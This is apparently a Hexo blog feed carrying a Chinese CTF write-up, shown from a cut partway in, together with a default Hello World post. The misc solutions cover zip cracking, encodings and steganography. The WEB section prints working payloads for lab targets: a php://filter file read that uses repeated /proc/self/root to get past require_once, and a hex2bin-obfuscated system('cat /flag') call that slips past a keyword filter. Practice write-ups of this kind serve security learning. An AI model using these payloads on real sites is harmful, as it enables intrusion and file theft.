src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e8941fdd917.jpg" alt="QQ截图20220802100313.jpg"><br>写入zip密码解压即可获得flag<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e8942085968.jpg" alt="QQ截图20220802100318.jpg"></p><h3 id="2-EasyEncode"><a href="#2-EasyEncode" class="headerlink" title="(2)EasyEncode"></a>(2)EasyEncode</h3><p>下载附件是个zip文件解压有密码<br>先来试试伪加密防止搞半天白搞<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e8942239dc1.jpg" alt="QQ截图20220802100327.jpg"><br>发现不是伪加密</p><p>那就用ziperello暴力破解一下<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e894c11e334.jpg" alt="QQ截图20220802100333.jpg"><br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e894c19a7e9.jpg" alt="QQ截图20220802100339.jpg"><br>得出密码位100861<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e894c31acd9.jpg" alt="QQ截图20220802100345.jpg"><br>得到一段摩斯密码解密得到十六进制数据<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e895416145d.jpg" alt="QQ截图20220802110840.jpg"><br>将内容放到编辑器查看获得unicode编码数据<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e894c24df79.jpg" alt="QQ截图20220802100359.jpg"><br>进行转中文<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e894c368353.jpg" alt="QQ截图20220802100411.jpg"><br>发现又url编码再次解码<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e894c3df7d7.jpg" alt="QQ截图20220802100418.jpg"><br>获得base64编码再次解码获得flag<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e894c4c61cd.jpg" alt="QQ截图20220802100424.jpg"></p><h3 id="3-你知道js吗"><a href="#3-你知道js吗" class="headerlink" title="(3)你知道js吗"></a>(3)你知道js吗</h3><p>下载附件习惯性查看一下16进制<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e894c576100.jpg" alt="QQ截图20220802100431.jpg"><br>发现xml尝试修改后缀为doc<br>打开获得一串数据<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e894c63b2ca.jpg" alt="QQ截图20220802100444.jpg"><br>发现是base64编码的格式<br>解码获得数据<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e894c8e24c0.jpg" alt="QQ截图20220802100453.jpg"><br>发现url编码特点解码<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e894c816605.jpg" alt="QQ截图20220802100504.jpg"><br>发现了brainfuck的特点再次解码<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e894c92f8b0.jpg" alt="QQ截图20220802100511.jpg"><br>获得十六进制数据放入即可获得flag<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e894c996a8c.jpg" alt="QQ截图20220802100516.jpg"></p><h3 id="4-StrangeTraffic"><a href="#4-StrangeTraffic" class="headerlink" title="(4)StrangeTraffic"></a>(4)StrangeTraffic</h3><p>没看懂获取tcp后的步骤之后搞懂再补充</p><h3 id="5-EasyWord"><a href="#5-EasyWord" class="headerlink" title="(5)EasyWord"></a>(5)EasyWord</h3><p>下载附件返现doc和rar多进行了加密只有hint没有加密<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e896671299b.jpg" alt="QQ截图20220802100521.jpg"><br>查看发现这提示掩码攻击<br>然后就不懂了</p><h3 id="6-Python-jail"><a href="#6-Python-jail" class="headerlink" title="(6)Python_jail"></a>(6)Python_jail</h3><p>下载附件发现有三个文件，一个内容为介绍，一个为空，一个是一个加密的zip<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e896669ecb3.jpg" alt="QQ截图20220802100529.jpg"></p><p>更具介绍和空白想到空白编码上工具<br><a href="https://vii5ard.github.io/whitespace/">https://vii5ard.github.io/whitespace/</a><br>将空白的编码输入进去进行解密<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e897d50936b.jpg" alt="QQ截图20220802100536.jpg"><br>解密获得照片</p><p><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e8966871f4d.jpg" alt="QQ截图20220802100546.jpg"><br>看到照片首先想到lsb</p><p><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e896692c01f.jpg" alt="QQ截图20220802100702.jpg"><br>获得得到base64编码<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e8980feeee7.jpg" alt="QQ截图20220802100709.jpg"><br>base64解码得到flag<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e8982f44e10.jpg" alt="QQ截图20220802100715.jpg"></p><h3 id="7-codegame"><a href="#7-codegame" class="headerlink" title="(7)codegame"></a>(7)codegame</h3><p>下载附件名字叫zip那就尝试修改后缀为zip进行解压发现两个文件<br>查看文档发现是LOLCODE编码尝试运行<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e9109587430.jpg" alt="QQ截图20220802100720.jpg"><br><a href="https://www.dcode.fr/lolcode-language">https://www.dcode.fr/lolcode-language</a><br>网站运行<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e910e78d3f5.jpg" alt="QQ截图20220802100726.jpg"></p><p>输入密码解压然后发现还有一个doc文件进去发现是空白摆烂想到题目里面zip改后缀为zip再试试<br>解压发现fllllll1ag文件打开发现是表情果断解密<br><a href="https://aghorler.github.io/emoji-aes/">https://aghorler.github.io/emoji-aes/</a><br>把解压密码带入key尝试解密发现解密不出来<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e89668128e1.jpg" alt="QQ截图20220802100739.jpg"></p><p>有解不出来摆烂摆烂摆烂然后看到advanced尝试修改发现4时解密成功<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e91101bd7cb.jpg" alt="QQ截图20220802100744.jpg"><br>解密出来16进制数据进行编译器查看<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e9110ed0d00.jpg" alt="QQ截图20220802100749.jpg"></p><h3 id="被污染的二维码"><a href="#被污染的二维码" class="headerlink" title="被污染的二维码"></a>被污染的二维码</h3><p>下载附件发现时一个zip文件名的文件尝试修改后缀位zip<br>发现得到两个文件都拉进010看看十六进制<br>在这里插入图片描述<img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e9112aadb23.jpg" alt="QQ截图20220802100755.jpg"></p><p><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e9112b33a68.jpg" alt="QQ截图20220802100801.jpg"><br>发现一个是png文件一个是7z文件<br>尝试将png文件进行binwalk分离<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e9113f622a0.jpg" alt="QQ截图20220802100807.jpg"><br>获<img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e9119587879.jpg" alt="QQ截图20220802195907.jpg"><br>再看flag2的十六进制的数据发现文件头有问题<br>正常zip的文件头为377ABCAF<br>更改另存为zip即可获取<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e91149382a4.jpg" alt="QQ截图20220802100813.jpg">)<br>使用刚才的密码即可解压获取到一串数据</p><p><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e911cc240e4.jpg" alt="QQ截图20220802100820.jpg">发现足有127列猜测是零宽<br><a href="http://330k.github.io/misc_tools/unicode_steganography.html">http://330k.github.io/misc_tools/unicode_steganography.html</a><br>网站开解<br>这里解释后要选择前三个（没有理解为什么要选前三个理解之后再回来写）<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e911e225e0f.jpg" alt="QQ截图20220802100827.jpg"><br><img src="/hello-world-1/bd8ab48bebc544b5899af2e8872ea91d.png" alt="在这里插入图片描述"><br>发下隐藏的是N-ZA-M对应想到rot13那就再去rot13一波<br><a href="http://www.mxcz.net/tools/rot13.aspx">http://www.mxcz.net/tools/rot13.aspx</a><br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e91200e446b.jpg" alt="QQ截图20220802100838.jpg"><br>一看芜湖base64来了解密解密解密<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e9120cded1a.jpg" alt="QQ截图20220802100844.jpg"><br>崩了啊怎么还隐藏四位<br>只能跑回flag1的照片里面再试试修改后缀为png然后发现磨碎的二维码然后尝试修复<br><a href="https://merricx.github.io/qrazybox/">https://merricx.github.io/qrazybox/</a><br>表示对该工具不熟悉我尝试拖进去一直拖不进去没法下一步修补之后扫描即可获得中间四位得到完整二维码</p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="phpdest"><a href="#phpdest" class="headerlink" title="phpdest"></a>phpdest</h3><p>方法一<br>进入靶机查看发现有require_once要绕过该函数（只要包含过一次便不会包含）然后读取flag4的内容<br>常见的方法就想到了伪协议和多级符号链接的方法结合绕过<br>这里就要了解&#x2F;proc&#x2F;self和&#x2F;proc&#x2F;self&#x2F;root的含义<br>&#x2F;proc&#x2F;self&#x2F;指当前进程，而&#x2F;proc&#x2F;self&#x2F;root&#x2F;指’’&#x2F;‘’<br>这里如果我们知识使用一些proc&#x2F;self&#x2F;root的话最后也会被转化变为正确的路径导致无法绕过，但凡事都有一个上限当我们超过他所能接受的上限就可以导致其无法识别进而无法转换达到绕过的效果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</span><br></pre></td></tr></table></figure><p><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e9129fca893.jpg" alt="QQ截图20220802200234.jpg"><br>进行base64转换即可获取到flag</p><h3 id="EasyPHP"><a href="#EasyPHP" class="headerlink" title="EasyPHP"></a>EasyPHP</h3><p>下载靶机发现没什么思路那就代码分析一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);  //提高亮度没什么用</span><br><span class="line">include &quot;fl4g.php&quot;;</span><br><span class="line">$dest0g3 = $_POST[&#x27;ctf&#x27;];//post传入擦书</span><br><span class="line">$time = date(&quot;H&quot;);//设置时间参数</span><br><span class="line">$timme = date(&quot;d&quot;);</span><br><span class="line">$timmme = date(&quot;i&quot;);</span><br><span class="line">if(($time &gt; &quot;24&quot;) or ($timme &gt; &quot;31&quot;) or ($timmme &gt; &quot;60&quot;))&#123;//条件判断时间超过24小时或者超过31天或者超过60s都是无法实现的</span><br><span class="line">    echo $fl4g;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;Try harder!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">set_error_handler(//该函数用我的理解就是自己设置报错方式</span><br><span class="line">    function() use(&amp;$fl4g) &#123;</span><br><span class="line">        print $fl4g;</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line">$fl4g .= $dest0g3;</span><br><span class="line">?&gt; Try harder!</span><br></pre></td></tr></table></figure><p>由于上面if语句根本不可能实现<br>所以我们就要尝试利用函数set_error_hander进行报错输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf[]=123</span><br></pre></td></tr></table></figure><p><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e912a125436.jpg" alt="QQ截图20220802200258.jpg"></p><h3 id="SimpleRCE"><a href="#SimpleRCE" class="headerlink" title="SimpleRCE"></a>SimpleRCE</h3><p><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e912f903436.jpg" alt="QQ截图20220802200504.jpg"><br>一进去就看到一堆过滤词汇直接奔溃<br>然后看代码发现str_replace函数一般该函数都是用hex2bin()进行绕过同时发现’()‘和单引号没有过滤那就肯定了这一做法<br>hex2bin的用法大家可以自行百度<br>然后绕过机制就为post传入aaa&#x3D;hex2bin(‘73797374656d’)(hex2bin(‘636174202f666c6167’));&#x2F;&#x2F;system(cat &#x2F;flag)<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e912a1b86a1.jpg" alt="QQ截图20220802200308.jpg"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;AI&quot;&gt;&lt;a href=&quot;#AI&quot; class=&quot;headerlink&quot; title=&quot;AI&quot;&gt;&lt;/a&gt;AI&lt;/h2&gt;&lt;h3 id=&quot;1-OCR&quot;&gt;&lt;a href=&quot;#1-OCR&quot; class=&quot;headerlink&quot; title=&quot;(1)OCR&quot;&gt;&lt;/a&gt;(1)</summary>
      
    
    
    
    <category term="CTF" scheme="http://just-aleaf.github.io/categories/CTF/"/>
    
    
    <category term="CTF" scheme="http://just-aleaf.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://just-aleaf.github.io/2022/08/01/hello-world/"/>
    <id>http://just-aleaf.github.io/2022/08/01/hello-world/</id>
    <published>2022-07-31T17:02:01.949Z</published>
    <updated>2022-07-31T17:02:01.949Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
</feed>
